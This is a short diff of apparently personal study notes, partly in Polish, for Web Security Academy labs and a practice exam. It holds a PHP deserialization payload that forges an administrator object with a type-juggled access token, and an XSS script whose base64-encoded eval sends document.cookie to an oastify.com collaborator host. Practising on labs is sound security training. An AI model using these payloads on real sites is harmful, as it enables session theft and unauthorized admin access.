@@ -10,3 +10,13 @@ mfa > (w pierwszym requuescie login2) veryfi=carlos >  (w pierwszym requuescie l
 serialized object > GET /admin Admin interface only available  > 
              origina; O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ns4hisz8wfus9knyhwa0prtm0ty36iai";}
              payload O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
+
+
+
+practise exam pauload:
+z location, bo location omija CORS
+
+<script>
+location = "https://0a9e000d047376a4804a128f00690043.web-security-academy.net/?SearchTerm=\"-eval(atob('bG9jYXRpb249J2h0dHBzOi8vamQwY2Q0d2pxZGNrZ2FqOTFzeTloZ3k1M3c5bnhmbDQub2FzdGlmeS5jb20vP2M9Jytkb2N1bWVudC5jb29raWU='))-\"";
+</script>
